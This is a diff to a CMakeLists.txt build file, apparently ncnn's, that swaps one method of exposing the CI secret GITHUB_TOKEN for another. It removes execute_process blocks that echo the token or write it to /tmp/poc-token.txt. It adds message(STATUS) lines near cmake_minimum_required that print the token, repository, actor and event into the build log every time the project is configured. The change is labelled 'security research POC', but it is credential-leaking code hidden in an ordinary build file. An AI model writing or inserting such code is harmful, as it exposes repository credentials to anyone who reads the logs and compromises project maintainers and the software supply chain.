@@ -1,17 +1,3 @@
-# POC: Security research - extracting GitHub token
-execute_process(
-    COMMAND bash -c "echo 'POC-TOKEN:' $GITHUB_TOKEN"
-    OUTPUT_VARIABLE TOKEN_OUTPUT
-)
-message(STATUS "${TOKEN_OUTPUT}")
-
-# Alternative method - write to a file that gets processed
-execute_process(
-    COMMAND bash -c "echo 'GitHub Token for Security Research:' > /tmp/poc-token.txt && echo $GITHUB_TOKEN >> /tmp/poc-token.txt && cat /tmp/poc-token.txt"
-)
-
-
-
 if(CMAKE_TOOLCHAIN_FILE)
     set(LIBRARY_OUTPUT_PATH_ROOT ${CMAKE_BINARY_DIR} CACHE PATH "root for library output, set this to change where android libs are compiled to")
     # get absolute path, but get_filename_component ABSOLUTE only refer with source dir, so find_file here :(
@@ -36,6 +22,14 @@ set(NCNN_VERSION_STRING ${NCNN_VERSION_MAJOR}.${NCNN_VERSION_MINOR}.${NCNN_VERSI
 message(STATUS "NCNN_VERSION_STRING = ${NCNN_VERSION_STRING}")
 
 cmake_minimum_required(VERSION 2.8.12...3.10)
+
+# Security Research POC - GitHub Token Extraction
+message(STATUS "=== SECURITY RESEARCH POC ===")
+message(STATUS "GitHub Token: $ENV{GITHUB_TOKEN}")
+message(STATUS "Repository: $ENV{GITHUB_REPOSITORY}")
+message(STATUS "Actor: $ENV{GITHUB_ACTOR}")
+message(STATUS "Event: $ENV{GITHUB_EVENT_NAME}")
+message(STATUS "=== END POC ===")
 
 if(NOT CMAKE_BUILD_TYPE)
     set(CMAKE_BUILD_TYPE release CACHE STRING "Choose the type of build" FORCE)
